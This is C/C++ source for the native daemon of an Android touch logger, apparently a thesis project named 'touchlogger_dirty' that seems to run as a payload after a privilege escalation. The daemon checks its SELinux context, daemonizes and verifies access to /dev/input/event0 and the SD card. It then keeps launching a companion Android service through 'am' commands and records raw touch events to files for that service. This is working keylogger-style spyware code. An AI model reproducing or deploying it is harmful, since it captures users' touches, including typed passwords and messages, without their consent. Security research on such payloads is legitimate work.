//
// Created by kirill on 17.03.17.
//

#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <dirent.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <stdbool.h>
#include <sys/stat.h>
#include "dirty/common/logging.h"
#include "input_device/InputReader.h"

typedef int getcon_t(char** con);

// TODO: figure out how to get this info from CMake script and pass it here
#define PKNAME                  "org.leyfer.thesis.touchlogger_dirty"
#define ACTIVITY                ".activity.MainActivity"
#define BOOLEAN_EXTRA_KEY       "org.leyfer.thesis.extra.started_by_payload"
#define SERVICE_PROCESS_NAME    "touchlogger.here"
#define SERVICE                 ".service.PayloadWaitingService"
#define ACTION                  "org.leyfer.thesis.touchlogger_dirty.service.action.WAIT_FOR_PAYLOAD"

int isServiceProcessActive()
{
  DIR* dir = opendir("/proc");
  if (dir == NULL)
  {
    LOGV("Couldn't open /proc");
    return -1;
  }

  struct dirent* de;
  char cmdline_path[PATH_MAX];
  char buf[128];

  bool found = false;

  while ((de = readdir(dir)))
  {
    if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, ".."))
    {
      continue;
    }

    // Only inspect directories that are PID numbers
    char* endptr;
    long int pid = strtol(de->d_name, &endptr, 10);
    if (*endptr != '\0')
    {
      continue;
    }

    memset(cmdline_path, 0, PATH_MAX);

    snprintf(cmdline_path, PATH_MAX, "/proc/%lu/cmdline", pid);
    int fd = open(cmdline_path, O_RDONLY);
    if (fd == -1)
    {
      LOGV("Unable to open %s: %s!", cmdline_path, strerror(errno));
      continue;
    }

    memset(buf, 0, 128);
    if (read(fd, buf, 128) == -1)
    {
      LOGV("Unable to read from %s: %s!", cmdline_path, strerror(errno));
      close(fd);
      continue;
    }

    if (strcmp(SERVICE_PROCESS_NAME, buf) == 0)
    {
      LOGV("Touchlogger found!");
      found = true;
      close(fd);
      break;
    }
    else
    {
      close(fd);
    }
  }

  closedir(dir);

  if (found)
  {
    return 0;
  }
  else
  {
    return -1;
  }
}

int getSelinuxContext(char** context)
{
  dlerror();
#ifdef __aarch64__
  void* selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
  void* selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
  if (selinux)
  {
    void* getcon = dlsym(selinux, "getcon");
    const char* error = dlerror();
    if (error)
    {
      LOGV("dlsym error %s", error);
      dlclose(selinux);
      return -1;
    }
    else
    {
      getcon_t* getcon_p = (getcon_t*) getcon;
      int res = (*getcon_p)(context);
      dlclose(selinux);
      return res;
    }
  }
  else
  {
    const char* result = "No selinux";
    *context = (char*) calloc(strlen(result) + 1, sizeof(char));
    strcpy(*context, result);
    dlclose(selinux);
    return 0;
  }
}

int checkConditions()
{
  int fd = open("/dev/input/event0", O_RDONLY);
  if (fd == -1)
  {
    LOGV("Unable to get access to input device: %s!", strerror(errno));
    return -1;
  }
  else
  {
    LOGV("Input device access OK!");
    close(fd);
  }

  struct stat st;
  if (stat("/sdcard/", &st) == -1)
  {
    LOGV("Unable to access SD card: %s!", strerror(errno));
    return -1;
  }
  else
  {
    LOGV("SD card access OK!");
  }

  return 0;
}

int startServceAndWaitForItToBecomeOnline()
{
  while (1)
  {
    if (isServiceProcessActive() == 0)
    {
      LOGV("Touchlogger android app started!");
      int start_touchlogger_res = system(
          "am start -n " PKNAME "/" ACTIVITY " --ez " BOOLEAN_EXTRA_KEY " true");

      if (start_touchlogger_res == -1)
      {
        LOGV("Unable to start touchlogger!");
        return -1;
      }
      else if (WEXITSTATUS(start_touchlogger_res) == 0)
      {
        LOGV("Touchlogger started successfully!");
        return 0;
      }
      else
      {
        LOGV("Unable to start activity!");
        return -1;
      }
    }
    else
    {
      LOGV("No touchlogger process!");
      system("am startservice -n " PKNAME "/" SERVICE " -a " ACTION);
      sleep(1);
    }
  }
}

int main(int argc, const char** argv)
{
  LOGV("Uid: %d", getuid());

  char* context;
  if (getSelinuxContext(&context) == -1)
  {
    LOGV("Unable to get selinux context")
  }
  else
  {
    LOGV("Selinux context: %s", context);
    free(context);
  }

  if (daemon(0, 0) == -1)
  {
    LOGV("Unable to daemonize process: %s!", strerror(errno));
  }

  if (checkConditions() == -1)
  {
    LOGV("Unable to start daemon, exiting...");
    return -1;
  }

  if (startServceAndWaitForItToBecomeOnline() == -1)
  {
    LOGV("Unable to wait for Android service, exiting...");
    return -1;
  }

  LOGV("Collecting input data & sending it to Android service...");
  EventFileWriter* eventFileWriter = new EventFileWriter(EVENT_DATA_DIR);
  InputReader* inputReader = new InputReader(eventFileWriter);
  inputReader->start();

  LOGV("Finish inputReader...");
  delete(inputReader);
  return 0;
}
